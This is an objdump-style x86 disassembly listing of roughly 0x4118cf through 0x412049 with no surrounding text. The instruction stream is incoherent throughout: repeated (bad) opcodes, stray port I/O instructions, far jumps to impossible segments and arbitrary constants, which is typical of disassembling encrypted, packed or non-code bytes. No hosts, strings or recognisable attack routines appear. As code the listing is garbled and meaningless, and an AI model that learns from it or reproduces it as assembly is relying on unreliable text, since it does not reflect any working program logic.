  4118cf:	repnz cmp cl,BYTE PTR [edx-0x2b]
  4118d3:	sub    edi,DWORD PTR [eax-0x22]
  4118d6:	jl     0x41191e
  4118d8:	and    BYTE PTR [esi],bh
  4118da:	and    ebx,DWORD PTR [esp+edx*2-0x69]
  4118de:	fild   WORD PTR [edi+edi*4+0x42904325]
  4118e5:	adc    al,0x47
  4118e7:	xlat   BYTE PTR ds:[ebx]
  4118e8:	mov    ah,0x5b
  4118ea:	mov    ebp,0x38c3a810
  4118ef:	mov    ds:0x688cdf28,eax
  4118f4:	xchg   esp,eax
  4118f5:	out    dx,eax
  4118f6:	test   edx,ecx
  4118f8:	mov    ch,0x4b
  4118fa:	int    0xfe
  4118fc:	rcr    BYTE PTR [ebx+0x6e],cl
  4118ff:	mov    eax,0xcd2eebe4
  411904:	gs cdq 
  411906:	stos   BYTE PTR es:[edi],al
  411907:	sar    BYTE PTR [ebx+0x3dcbb686],1
  41190d:	adc    al,BYTE PTR [esi]
  41190f:	and    cl,BYTE PTR [edi+0x537e694]
  411915:	or     dl,bl
  411917:	and    ch,cl
  411919:	data16 js 0x411961
  41191c:	push   edx
  41191d:	pop    bx
  41191f:	push   esi
  411920:	adc    al,BYTE PTR [eax]
  411922:	lea    edi,[ebx]
  411924:	popa   
  411925:	pop    ecx
  411926:	pop    esi
  411927:	mov    cl,0x93
  411929:	add    eax,0xd97ff819
  41192e:	enter  0xe77,0xd8
  411932:	ss iret 
  411934:	enter  0xe049,0x7c
  411938:	adc    esi,DWORD PTR [esi+ebx*2-0xcd3f3e2]
  41193f:	pushf  
  411940:	pushf  
  411941:	mov    dl,bl
  411943:	mov    ebx,0x72ee7a9a
  411948:	cmp    dh,bh
  41194a:	cwde   
  41194b:	xchg   di,ax
  41194d:	mov    ds,WORD PTR [eax+0x9]
  411950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411951:	xor    eax,0x19eaf9a8
  411956:	jb     0x411984
  411958:	mov    DWORD PTR [ebx],0x11fe6321
  41195e:	lea    esi,[edx]
  411960:	test   eax,0xa9b36d4b
  411965:	imul   edx,DWORD PTR [ecx+0xfc1c07d],0x1818ee2
  41196f:	test   edx,0xc19618de
  411975:	mov    ebp,0xfed4d627
  41197a:	xlat   BYTE PTR ds:[ebx]
  41197b:	jge    0x4119f5
  41197d:	dec    ecx
  41197e:	pop    ebx
  41197f:	test   eax,0x5f102379
  411984:	add    DWORD PTR [esi],ebx
  411986:	in     al,dx
  411987:	out    dx,eax
  411988:	fdiv   DWORD PTR [eax-0x61800517]
  41198e:	loopne 0x411975
  411990:	(bad)  
  411991:	pusha  
  411992:	sbb    bl,0xa8
  411995:	add    al,0xeb
  411997:	in     eax,dx
  411998:	mov    ds,WORD PTR [edi+0x74]
  41199b:	into   
  41199c:	iret   
  41199d:	push   0x1cfdb1da
  4119a2:	pop    edi
  4119a3:	(bad)  
  4119a4:	out    0x2b,al
  4119a6:	sub    eax,0x4783ef6f
  4119ab:	push   es
  4119ac:	loop   0x4119d5
  4119ae:	es jge 0x411992
  4119b1:	scas   eax,DWORD PTR es:[edi]
  4119b2:	daa    
  4119b3:	adc    DWORD PTR [edi-0x5421901d],edi
  4119b9:	fcomp  DWORD PTR [ebp+edx*2+0x6c]
  4119bd:	aaa    
  4119be:	cli    
  4119bf:	or     cl,BYTE PTR [ebp+0x3a]
  4119c2:	or     al,0x4e
  4119c4:	push   ebp
  4119c5:	inc    ebp
  4119c6:	xchg   ecx,eax
  4119c7:	push   ecx
  4119c8:	pop    edi
  4119c9:	daa    
  4119ca:	mov    ds:0x71b289a2,al
  4119cf:	ins    DWORD PTR es:[edi],dx
  4119d0:	loope  0x411a4c
  4119d2:	aad    0x91
  4119d4:	mov    eax,ds:0x3f9bf8
  4119d9:	repz dec eax
  4119db:	jecxz  0x411a4b
  4119dd:	jg     0x411a59
  4119df:	daa    
  4119e0:	cli    
  4119e1:	pop    eax
  4119e2:	add    ebx,0x34
  4119e5:	push   ebx
  4119e6:	inc    ecx
  4119e7:	or     ch,cl
  4119e9:	loopne 0x411a1a
  4119eb:	jg     0x411999
  4119ed:	in     eax,dx
  4119ee:	sub    al,0x5b
  4119f0:	jp     0x411a0e
  4119f2:	pop    ebp
  4119f3:	test   DWORD PTR [eax-0x189c37f5],eax
  4119f9:	jl     0x4119ba
  4119fb:	push   esp
  4119fc:	push   es
  4119fd:	retf   
  4119fe:	inc    ebp
  4119ff:	aam    0xe2
  411a01:	in     al,dx
  411a02:	sahf   
  411a03:	xchg   esi,eax
  411a04:	cld    
  411a05:	ss sub BYTE PTR ds:[edx],dh
  411a09:	fwait
  411a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a0b:	imul   edi,eax,0x72
  411a0e:	inc    ebp
  411a0f:	(bad)  
  411a10:	xchg   ebx,eax
  411a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a12:	ins    DWORD PTR es:[edi],dx
  411a13:	call   0x76ed:0x73772e04
  411a1a:	out    dx,eax
  411a1b:	enter  0x1826,0xf7
  411a1f:	out    0xf0,al
  411a21:	psllw  mm6,QWORD PTR [eax-0x2a]
  411a25:	push   ebp
  411a26:	cli    
  411a27:	fstp   DWORD PTR [ebx]
  411a29:	scas   al,BYTE PTR es:[edi]
  411a2a:	xor    BYTE PTR [edi],ah
  411a2c:	or     DWORD PTR [ebp-0x1a4a6f7a],0xfffffff2
  411a33:	(bad)  
  411a35:	cmp    al,0x47
  411a37:	and    bl,al
  411a39:	mov    cl,0x7
  411a3b:	and    ebx,DWORD PTR ds:0xded4bb58
  411a41:	fldcw  WORD PTR [edi+0x156d18aa]
  411a47:	fstp   DWORD PTR [ecx+0xd]
  411a4a:	fdiv   DWORD PTR [eax]
  411a4c:	pop    ds
  411a4d:	xor    BYTE PTR [ebx],bh
  411a4f:	retf   
  411a50:	push   ss
  411a51:	sbb    bh,al
  411a53:	sub    eax,0x7277e81b
  411a58:	push   ebx
  411a59:	mov    edi,0x53c85fd3
  411a5e:	cwde   
  411a5f:	in     al,0x73
  411a61:	dec    esi
  411a62:	jno    0x411a38
  411a64:	and    ch,bl
  411a66:	mov    BYTE PTR ds:0xefa02dca,bh
  411a6c:	lahf   
  411a6d:	mov    ecx,0x5c1a3a11
  411a72:	push   ebx
  411a73:	pop    ecx
  411a74:	repz int3 
  411a76:	lea    ecx,[edx+0x40]
  411a79:	xor    ch,BYTE PTR [edx+0x43882f8c]
  411a7f:	out    dx,al
  411a80:	fwait
  411a81:	sub    DWORD PTR [esi],ecx
  411a83:	inc    eax
  411a84:	push   ebp
  411a85:	push   edx
  411a86:	outs   dx,DWORD PTR ds:[esi]
  411a87:	shr    ebx,cl
  411a89:	loopne 0x411a6f
  411a8b:	js     0x411ae7
  411a8d:	loope  0x411af2
  411a8f:	cmp    ebx,ecx
  411a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a92:	inc    edx
  411a93:	fmul   DWORD PTR [ebp+0x67]
  411a96:	pop    ebx
  411a97:	sub    al,0xf
  411a99:	xor    eax,DWORD PTR [esi+0x9e67bff]
  411a9f:	dec    ebx
  411aa0:	pop    ss
  411aa1:	in     eax,dx
  411aa2:	test   dh,bl
  411aa4:	dec    edx
  411aa5:	fmul   st(2),st
  411aa7:	fsubr  st(5),st
  411aa9:	cld    
  411aaa:	into   
  411aab:	mov    al,ds:0xd410bde4
  411ab0:	pusha  
  411ab1:	mov    dh,0x2
  411ab3:	aad    0x3e
  411ab5:	jl     0x411aa8
  411ab7:	xlat   BYTE PTR ds:[ebx]
  411ab8:	mov    eax,ds:0xdf23cc4a
  411abd:	jge    0x411b1a
  411abf:	outs   dx,BYTE PTR ds:[esi]
  411ac0:	inc    esi
  411ac1:	lds    esi,FWORD PTR [ecx+0x79]
  411ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac5:	daa    
  411ac6:	dec    edx
  411ac7:	adc    cl,bl
  411ac9:	pop    es
  411aca:	loope  0x411af5
  411acc:	mov    ebp,0x94299a83
  411ad1:	jmp    0x6e0847cd
  411ad6:	push   edx
  411ad7:	adc    DWORD PTR [ebx],edx
  411ad9:	mov    esp,edi
  411adb:	xor    eax,0xa4c23bdd
  411ae0:	inc    eax
  411ae1:	mov    bl,0xbd
  411ae3:	mov    esp,0xecb11366
  411ae8:	out    dx,eax
  411ae9:	fbld   TBYTE PTR [ecx-0x9ea6f40]
  411aef:	or     ebp,esi
  411af1:	arpl   WORD PTR [esi-0xf],cx
  411af4:	inc    ebp
  411af5:	xchg   ebp,eax
  411af6:	inc    esp
  411af7:	pop    esi
  411af8:	aad    0xfa
  411afa:	mov    ecx,esi
  411afc:	inc    ecx
  411afd:	xchg   edx,eax
  411afe:	xchg   DWORD PTR [esi-0x72e1c013],edi
  411b04:	mov    esi,0x26dd163b
  411b09:	out    dx,al
  411b0a:	imul   esp,DWORD PTR [edi-0x45accbfb],0x3
  411b11:	es sahf 
  411b13:	jae    0x411b45
  411b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b16:	int3   
  411b17:	sti    
  411b18:	test   al,0x3b
  411b1a:	push   ecx
  411b1b:	ds lock mov ebp,0x893ead27
  411b22:	outs   dx,DWORD PTR ds:[esi]
  411b23:	xor    dh,BYTE PTR [esi+0x48]
  411b26:	out    dx,eax
  411b27:	mov    edx,0x66df5a45
  411b2c:	jecxz  0x411afc
  411b2e:	dec    eax
  411b2f:	push   cs
  411b30:	inc    esp
  411b31:	add    cl,BYTE PTR [ebx+eiz*4]
  411b34:	sbb    dh,dh
  411b36:	mov    al,0x7b
  411b38:	xor    al,BYTE PTR [eax-0x4fd9c71a]
  411b3e:	sub    al,0x16
  411b40:	jp     0x411aec
  411b42:	fsubr  st,st(5)
  411b44:	test   eax,0x3b82440c
  411b49:	clc    
  411b4a:	adc    dl,BYTE PTR [ecx-0x347590e5]
  411b50:	mov    ebp,0x1233900d
  411b55:	sub    eax,DWORD PTR [edi-0x28]
  411b58:	mov    edi,DWORD PTR [esi+0x7e2b1e43]
  411b5e:	test   DWORD PTR ds:0x35449127,0xfe4eec52
  411b68:	sub    ebp,ecx
  411b6a:	call   ebx
  411b6c:	(bad)  
  411b6e:	adc    ecx,DWORD PTR [esp+edx*8-0x5f8607eb]
  411b75:	bound  eax,QWORD PTR [edx-0x66418ff6]
  411b7b:	dec    eax
  411b7c:	gs jmp 0x6a1:0xaab2a015
  411b84:	push   0xffffffbf
  411b86:	fst    DWORD PTR [edx+0x5c]
  411b89:	adc    DWORD PTR [esi-0x3dcbfef4],edx
  411b8f:	mov    eax,ds:0x7b34e2ea
  411b94:	imul   esp,DWORD PTR [edx-0x420dff58],0xffffffb0
  411b9b:	je     0x411b77
  411b9d:	xchg   ebx,eax
  411b9e:	sub    ebx,ebp
  411ba0:	ret    0xdeba
  411ba3:	repnz cdq 
  411ba5:	inc    esi
  411ba6:	(bad)
  411ba9:	sub    eax,0xb3a7728d
  411bae:	stos   DWORD PTR es:[edi],eax
  411baf:	push   ss
  411bb0:	je     0x411bd9
  411bb2:	or     eax,0x8a80247b
  411bb7:	les    edx,FWORD PTR [edx-0x57]
  411bba:	xor    ecx,DWORD PTR [edx+0x1]
  411bbd:	imul   esi,DWORD PTR [esi-0x45],0xb5583403
  411bc4:	test   ah,ah
  411bc6:	aad    0x23
  411bc8:	adc    ebp,DWORD PTR [edx+0x21]
  411bcb:	jl     0x411bb9
  411bcd:	xchg   edi,eax
  411bce:	inc    esp
  411bcf:	xor    BYTE PTR [ecx],bl
  411bd1:	out    dx,eax
  411bd2:	in     eax,0x7d
  411bd4:	inc    esi
  411bd5:	xchg   esp,eax
  411bd6:	adc    eax,DWORD PTR [edi+edi*4-0x620cf0e5]
  411bdd:	sub    BYTE PTR [ebp+0x48e5903c],bl
  411be3:	push   cs
  411be4:	ficomp DWORD PTR cs:[esi]
  411be7:	fmul   DWORD PTR [esi+0x42]
  411bea:	(bad)  
  411beb:	cmp    al,0x99
  411bed:	push   0xffffffdc
  411bef:	sbb    eax,0xc4592212
  411bf4:	cmp    DWORD PTR [eax-0x7f0a651c],eax
  411bfa:	mov    eax,0xeaa6deb0
  411bff:	xor    al,0xc9
  411c01:	gs xor eax,0xc874f539
  411c07:	std    
  411c08:	aaa    
  411c09:	or     al,0xa4
  411c0b:	push   ebx
  411c0c:	or     BYTE PTR [edx-0x79],ah
  411c0f:	pop    es
  411c10:	ret    0x2020
  411c13:	xor    DWORD PTR [ecx+0x2dcf5f51],ecx
  411c19:	leave  
  411c1a:	mov    ds:0x1f1cb968,eax
  411c1f:	xor    edx,DWORD PTR [eax+0x1]
  411c22:	jns    0x411bb8
  411c24:	sti    
  411c25:	pushf  
  411c26:	sub    ah,al
  411c28:	pop    edx
  411c29:	jnp    0x411c4f
  411c2b:	hlt    
  411c2c:	cmp    al,0x1d
  411c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c2f:	(bad)  
  411c30:	jno    0x411c88
  411c32:	or     al,0xac
  411c34:	mov    ecx,0xb1acee4e
  411c39:	pop    eax
  411c3a:	inc    ebp
  411c3b:	lods   eax,DWORD PTR ds:[esi]
  411c3c:	cwde   
  411c3d:	pop    esi
  411c3e:	cmp    DWORD PTR [eax+esi*4-0x6b],ebx
  411c42:	fisubr DWORD PTR [ebx-0x52]
  411c45:	nop
  411c46:	loop   0x411c0e
  411c48:	inc    ecx
  411c49:	sti    
  411c4a:	sub    eax,ebx
  411c4c:	xchg   esi,eax
  411c4d:	dec    ebx
  411c4e:	xchg   esp,eax
  411c4f:	repz bound ebx,QWORD PTR [eax+eiz*2]
  411c53:	clc    
  411c54:	loopne 0x411c92
  411c56:	psubusw mm3,QWORD PTR [ecx+0x5c661e86]
  411c5d:	dec    ebp
  411c5e:	inc    edx
  411c5f:	and    dl,BYTE PTR [edx]
  411c61:	imul   edi,DWORD PTR [ebp-0xec8a1ea],0xffffffa7
  411c68:	mov    al,ds:0x58f3b087
  411c6d:	fnsave [edx]
  411c6f:	inc    ebp
  411c70:	adc    BYTE PTR [eax+0x31831759],dl
  411c76:	clc    
  411c77:	mov    eax,ds:0xe2f1dda2
  411c7c:	adc    al,0x49
  411c7e:	shl    BYTE PTR [ecx+0x30],0xa3
  411c82:	popa   
  411c83:	add    bl,bl
  411c85:	xchg   ebp,eax
  411c86:	(bad)  
  411c87:	(bad)
  411c8a:	test   BYTE PTR [eax+0x10f3575d],dl
  411c90:	cmc    
  411c91:	mov    ebp,0xe50212bb
  411c96:	mov    WORD PTR [ebx-0x6bea6929],gs
  411c9c:	leave  
  411c9d:	loop   0x411c4e
  411c9f:	cwde   
  411ca0:	jne    0x411d1c
  411ca2:	loope  0x411cdb
  411ca4:	(bad)
  411ca7:	jmp    0x332c:0x82875ec1
  411cae:	add    al,0x7c
  411cb0:	push   edi
  411cb1:	cmp    al,0xdf
  411cb3:	dec    eax
  411cb4:	xchg   ebp,eax
  411cb5:	mov    al,0x32
  411cb7:	and    bl,ah
  411cb9:	cmp    al,ch
  411cbb:	xchg   esp,eax
  411cbc:	ffreep st(1)
  411cbe:	xchg   ebx,eax
  411cbf:	ins    BYTE PTR es:[edi],dx
  411cc0:	jl     0x411d38
  411cc2:	xchg   ebp,eax
  411cc3:	(bad)  
  411cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc5:	test   ch,dh
  411cc7:	push   esi
  411cc8:	push   esp
  411cc9:	aaa    
  411cca:	sbb    dh,cl
  411ccc:	push   cs
  411ccd:	ror    DWORD PTR [edx-0x59],0xfa
  411cd1:	and    eax,0x99c1e7a1
  411cd6:	dec    edi
  411cd7:	mov    ah,0xd
  411cd9:	mov    ebx,0x94651553
  411cde:	or     edi,DWORD PTR [esi-0x6b]
  411ce1:	jb     0x411d08
  411ce3:	mov    esp,0x18ec29d1
  411ce8:	inc    ebx
  411ce9:	mov    bl,0x9
  411ceb:	and    ecx,DWORD PTR [eax+0x4cb46ea0]
  411cf1:	push   ecx
  411cf2:	or     al,0x56
  411cf4:	sbb    ah,BYTE PTR [eax+0x38]
  411cf7:	test   BYTE PTR [edx+0x37],dh
  411cfa:	aad    0xf8
  411cfc:	arpl   WORD PTR [esi-0x1bf13946],bp
  411d02:	daa    
  411d03:	dec    eax
  411d04:	pop    eax
  411d05:	lock adc ah,BYTE PTR [edi+0x7aa28fe]
  411d0c:	repnz fimul DWORD PTR [ecx]
  411d0f:	push   ecx
  411d10:	and    al,0x65
  411d12:	pop    eax
  411d13:	in     al,0xf2
  411d15:	adc    ah,BYTE PTR [eax]
  411d17:	mov    ds:0x64a00af1,al
  411d1c:	mov    esi,0x6b92274b
  411d21:	fwait
  411d22:	ins    BYTE PTR es:[edi],dx
  411d23:	jo     0x411cfe
  411d25:	cld    
  411d26:	mov    eax,DWORD PTR [ebp+0x77729e2d]
  411d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d2d:	out    0xac,eax
  411d2f:	neg    BYTE PTR [edi+eiz*8+0x3f]
  411d33:	fcmovbe st,st(4)
  411d35:	pop    ecx
  411d36:	out    0x6e,eax
  411d38:	sbb    eax,esp
  411d3a:	or     al,0x22
  411d3c:	and    ecx,DWORD PTR [ebp-0x37]
  411d3f:	sbb    edi,DWORD PTR [edx+0x2e036291]
  411d45:	fdivr  QWORD PTR [esi-0x43]
  411d48:	cmp    edx,DWORD PTR [ecx-0x71]
  411d4b:	cmp    eax,0x5c0d1f6f
  411d50:	shl    BYTE PTR [ebp+0x2b6d28b7],0x88
  411d57:	test   al,0x0
  411d59:	and    eax,DWORD PTR [edi+ecx*8-0x8f7715a]
  411d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d61:	mov    dl,0x7c
  411d63:	out    dx,al
  411d64:	pop    ebx
  411d65:	pop    DWORD PTR ds:0xc08bfc2b
  411d6b:	sub    BYTE PTR [esi+0x2],ah
  411d6e:	push   ecx
  411d6f:	ins    DWORD PTR es:[edi],dx
  411d70:	leave  
  411d71:	adc    BYTE PTR [esi-0x7cde5598],ah
  411d77:	repnz push es
  411d79:	jg     0x411d3f
  411d7b:	adc    DWORD PTR [ecx-0x32],ecx
  411d7e:	sti    
  411d7f:	push   ecx
  411d80:	cwde   
  411d81:	inc    eax
  411d82:	push   ebx
  411d83:	mov    bl,0xc5
  411d85:	(bad)  
  411d86:	cmp    esi,DWORD PTR [ebx+0x47]
  411d89:	mov    ds:0x8891e55e,al
  411d8e:	mov    WORD PTR [ecx],gs
  411d90:	mov    bl,0x11
  411d92:	popf   
  411d93:	cmc    
  411d94:	ror    BYTE PTR [edi+0x6f8294b7],cl
  411d9a:	jno    0x411e05
  411d9c:	mov    ecx,0x4c0e97f0
  411da1:	dec    esp
  411da2:	dec    esi
  411da3:	jmp    0x84013fdc
  411da8:	lahf   
  411da9:	daa    
  411daa:	push   ecx
  411dab:	repnz scas eax,DWORD PTR es:[edi]
  411dad:	mov    ebx,0xa1d5619f
  411db2:	fwait
  411db3:	shl    BYTE PTR [ecx-0x705dc140],1
  411db9:	mov    bh,0x14
  411dbb:	jp     0x411dda
  411dbd:	and    al,0xc8
  411dbf:	mov    ch,0xf5
  411dc1:	aam    0xb1
  411dc3:	pop    ecx
  411dc4:	pop    eax
  411dc5:	sbb    DWORD PTR [esi],esp
  411dc7:	(bad)  
  411dc8:	jns    0x411e07
  411dca:	mov    dh,0x4d
  411dcc:	and    DWORD PTR [ebp-0x3c854dfe],eax
  411dd2:	pop    ss
  411dd3:	test   eax,0x588c88ae
  411dd8:	addr16 in al,dx
  411dda:	ins    DWORD PTR es:[edi],dx
  411ddb:	sti    
  411ddc:	stos   BYTE PTR es:[edi],al
  411ddd:	jmp    0x411e03
  411ddf:	enter  0x9c68,0x90
  411de3:	mov    al,BYTE PTR [edi-0x5]
  411de6:	sti    
  411de7:	pushf  
  411de8:	xchg   esi,eax
  411de9:	sti    
  411dea:	push   0x78
  411dec:	bound  edi,QWORD PTR [edx]
  411dee:	test   eax,0xea9340cd
  411df3:	sbb    ch,BYTE PTR ds:0x204c74c2
  411df9:	fld    TBYTE PTR [edi+esi*8]
  411dfc:	js     0x411e3c
  411dfe:	sbb    al,0x66
  411e00:	push   edi
  411e01:	fisub  DWORD PTR [esi-0xf]
  411e04:	mov    edi,0x5d52828e
  411e09:	ret    0x436f
  411e0c:	dec    eax
  411e0d:	xor    DWORD PTR [esi+0x21],edi
  411e10:	dec    ebp
  411e11:	xchg   ebp,eax
  411e12:	add    BYTE PTR [edi-0x5],cl
  411e15:	lods   al,BYTE PTR ds:[esi]
  411e16:	pop    edx
  411e17:	mov    DWORD PTR [eax+0x3e3f1867],esi
  411e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e1e:	and    edi,DWORD PTR [eax-0x2767f23a]
  411e24:	and    esi,DWORD PTR [edi+0x2e]
  411e27:	cld    
  411e28:	addr16 das 
  411e2a:	test   DWORD PTR [ebp+eax*1-0x6b5b5098],esp
  411e31:	je     0x411e6d
  411e33:	mov    ds:0xf1f49594,al
  411e38:	or     dh,BYTE PTR [edx+0x28]
  411e3b:	sti    
  411e3c:	cmp    BYTE PTR [ebp+0x1d],bh
  411e3f:	daa    
  411e40:	pop    esp
  411e41:	mov    al,ds:0x708a3b24
  411e46:	sahf   
  411e47:	and    DWORD PTR [edx+0x348a555b],edi
  411e4d:	(bad)  
  411e4e:	addr16 std 
  411e50:	dec    ebp
  411e51:	ror    BYTE PTR [edx+0x20],0x0
  411e55:	ins    BYTE PTR es:[edi],dx
  411e56:	adc    DWORD PTR [edx-0x76],esp
  411e59:	dec    edi
  411e5a:	and    al,BYTE PTR [edx]
  411e5c:	fiadd  WORD PTR [ebp+0x6006c2e7]
  411e62:	stos   DWORD PTR es:[edi],eax
  411e63:	cdq    
  411e64:	xor    al,0xdc
  411e66:	cdq    
  411e67:	jo     0x411ea0
  411e69:	xchg   BYTE PTR [ebp+0x1e],ch
  411e6c:	pextrw esi,mm1,0xa6
  411e70:	into   
  411e71:	jno    0x411ed2
  411e73:	xor    eax,0x7b1deb0f
  411e78:	fisub  WORD PTR [ebp-0x28c99a26]
  411e7e:	(bad)  
  411e80:	(bad)  
  411e81:	dec    eax
  411e82:	test   BYTE PTR [eax-0x4fb73479],ch
  411e88:	into   
  411e89:	jb     0x411e70
  411e8b:	adc    eax,0xce153331
  411e90:	(bad)  
  411e92:	push   cs
  411e93:	mov    ebp,0x23d445b4
  411e98:	fs add al,0x42
  411e9b:	or     DWORD PTR [edi+0x1d456ada],0x2e
  411ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ea3:	cwde   
  411ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea5:	jmp    0x78fe1b67
  411eaa:	cld    
  411eab:	cmp    al,0x71
  411ead:	aam    0xb9
  411eaf:	ret    
  411eb0:	pop    edx
  411eb1:	(bad)  
  411eb2:	push   ebx
  411eb3:	scas   eax,DWORD PTR es:[edi]
  411eb4:	sti    
  411eb5:	popa   
  411eb6:	xchg   edx,eax
  411eb7:	lods   al,BYTE PTR ds:[esi]
  411eb8:	in     eax,0x5
  411eba:	repz cmp al,0xa2
  411ebd:	out    dx,eax
  411ebe:	pop    ds
  411ebf:	xchg   ecx,eax
  411ec0:	test   BYTE PTR [edi-0x11b8598],ch
  411ec6:	scas   eax,DWORD PTR es:[edi]
  411ec7:	dec    ebx
  411ec8:	mov    ebx,0xf7e251c9
  411ecd:	mov    ds:0xa7f40600,eax
  411ed2:	or     eax,ebp
  411ed4:	pop    esp
  411ed5:	inc    ecx
  411ed6:	xchg   BYTE PTR [eax+0x2827fdd1],dh
  411edc:	test   al,0x81
  411ede:	loop   0x411ec4
  411ee0:	xchg   DWORD PTR [ecx],eax
  411ee2:	ret    0x9a80
  411ee5:	cmp    edi,DWORD PTR [edx]
  411ee7:	jae    0x411eb9
  411ee9:	pop    eax
  411eea:	fs push ebx
  411eec:	pusha  
  411eed:	pop    ecx
  411eee:	or     al,0x93
  411ef0:	loop   0x411f39
  411ef2:	inc    eax
  411ef3:	retf   0xaf9d
  411ef6:	scas   eax,DWORD PTR es:[edi]
  411ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ef8:	aam    0x78
  411efa:	sub    BYTE PTR [eax],ah
  411efc:	mov    ds:0xfc5c49c1,eax
  411f01:	mov    ch,0x90
  411f03:	sar    esi,1
  411f05:	dec    edi
  411f06:	mov    fs,esp
  411f08:	dec    ebx
  411f09:	sar    BYTE PTR [edx],cl
  411f0b:	and    ah,BYTE PTR [edx]
  411f0d:	dec    esp
  411f0e:	(bad)  
  411f10:	cmp    eax,0xf6c6f354
  411f15:	lea    ecx,[edx+0x21]
  411f18:	jl     0x411ed2
  411f1a:	in     al,dx
  411f1b:	add    ah,bh
  411f1d:	aas    
  411f1e:	mov    bh,BYTE PTR [edi-0x14]
  411f21:	inc    ecx
  411f22:	adc    BYTE PTR [ebp-0x6],cl
  411f25:	in     al,dx
  411f26:	test   DWORD PTR [edx+0x54],eax
  411f29:	push   edi
  411f2a:	ja     0x411f4d
  411f2c:	mov    al,ds:0xd5d8fa98
  411f31:	pop    esp
  411f32:	mov    ch,0x35
  411f34:	test   al,0x8f
  411f36:	push   0xffffff99
  411f38:	shl    ah,0x45
  411f3b:	push   ecx
  411f3c:	jg     0x411f91
  411f3e:	sub    al,0xef
  411f40:	gs enter 0xd97f,0xc7
  411f45:	cmc    
  411f46:	cmp    bl,BYTE PTR [ecx+0x384b8c3b]
  411f4c:	cmp    ebp,DWORD PTR ds:0x42cef4ea
  411f52:	jge    0x411f5c
  411f54:	fnsetpm(287 only) 
  411f56:	ret    0x5c15
  411f59:	mov    bh,BYTE PTR [eax-0x52]
  411f5c:	mov    edi,DWORD PTR [edi-0x25]
  411f5f:	loop   0x411f48
  411f61:	jmp    0xd4eb:0x9256b3f3
  411f68:	xor    BYTE PTR [esp+esi*1],bh
  411f6b:	es fsubrp st(1),st
  411f6e:	xor    DWORD PTR [ebp-0x67731764],edi
  411f74:	jb     0x411f8a
  411f76:	push   esi
  411f77:	ret    
  411f78:	add    dh,BYTE PTR [edx+0x61]
  411f7b:	rcr    DWORD PTR ds:0x544fe57d,cl
  411f81:	mov    esp,0xaabf4778
  411f86:	outs   dx,DWORD PTR ds:[esi]
  411f87:	out    dx,al
  411f88:	lds    edi,FWORD PTR [ebp+0x46982500]
  411f8e:	imul   esp
  411f90:	int3   
  411f91:	push   0x65
  411f93:	mov    ch,0xc5
  411f95:	(bad)  
  411f96:	xchg   ebp,eax
  411f97:	mov    DWORD PTR [edx],edx
  411f99:	loop   0x411feb
  411f9b:	jae    0x411fd4
  411f9d:	xlat   BYTE PTR ds:[ebx]
  411f9e:	(bad)  
  411f9f:	in     al,dx
  411fa0:	cmp    cl,al
  411fa2:	jg     0x411f7a
  411fa4:	loope  0x411f2e
  411fa6:	repnz sahf 
  411fa8:	push   esi
  411fa9:	aad    0x69
  411fab:	iret   
  411fac:	jle    0x411f41
  411fae:	push   ss
  411faf:	xchg   BYTE PTR [eax+0x21],dl
  411fb2:	out    dx,eax
  411fb3:	lds    ebp,FWORD PTR [ecx-0x2640a3e2]
  411fb9:	xchg   edi,eax
  411fba:	fcmovu st,st(4)
  411fbc:	test   DWORD PTR [esp+eiz*4],edi
  411fbf:	jg     0x412018
  411fc1:	xchg   esi,eax
  411fc2:	mov    ds:0xf3428b31,eax
  411fc7:	fs dec ecx
  411fc9:	jmp    0xbfd3834e
  411fce:	xor    eax,0x92318519
  411fd3:	nop
  411fd4:	mov    WORD PTR [edx],?
  411fd6:	pop    esp
  411fd7:	out    dx,eax
  411fd8:	lea    esi,[edi-0x22ff9c41]
  411fde:	jge    0x412004
  411fe0:	sar    DWORD PTR [eax-0x63],cl
  411fe3:	pop    ebp
  411fe4:	lock xchg ebx,eax
  411fe6:	stos   BYTE PTR es:[edi],al
  411fe7:	data16 mov dl,0x39
  411fea:	xchg   edx,eax
  411feb:	outs   dx,BYTE PTR ds:[esi]
  411fec:	inc    edi
  411fed:	inc    ecx
  411fee:	pop    edx
  411fef:	pop    ecx
  411ff0:	inc    edi
  411ff1:	je     0x411fba
  411ff3:	jae    0x411fca
  411ff5:	push   ecx
  411ff6:	xor    BYTE PTR [eax],0xd7
  411ff9:	addr16 sbb ch,cl
  411ffc:	jge    0x411fe9
  411ffe:	jbe    0x411fd2
  412000:	add    esp,DWORD PTR [edi]
  412002:	inc    esi
  412003:	loope  0x411f91
  412005:	sbb    eax,DWORD PTR [edi]
  412007:	or     DWORD PTR [edx-0x37],0xffffffc9
  41200b:	sahf   
  41200c:	xor    esp,DWORD PTR [eax-0x2d]
  41200f:	dec    ebp
  412010:	shr    DWORD PTR [edi+0x37],0x3e
  412014:	jmp    0x411fcf
  412016:	retf   
  412017:	mov    ds:0x19e55b5e,eax
  41201c:	out    dx,eax
  41201d:	aaa    
  41201e:	mov    ebx,0x854ad726
  412023:	jns    0x412001
  412025:	jmp    0x2db127e3
  41202a:	js     0x411fdb
  41202c:	fs sahf 
  41202e:	ss pop edi
  412030:	cmc    
  412031:	dec    ebp
  412032:	mov    ch,0x71
  412034:	mov    bl,0x8c
  412036:	mov    ebx,DWORD PTR [esi]
  412038:	daa    
  412039:	mov    cl,0x4b
  41203b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203c:	pop    eax
  41203d:	gs push edx
  41203f:	dec    esp
  412040:	sub    BYTE PTR [ebx],0x21
  412043:	sub    dh,ah
  412045:	inc    ecx
  412046:	repz push cs
  412048:	in     al,dx
  412049:	test   DWORD PTR [ebx-0x505022f1],0x574e06cd
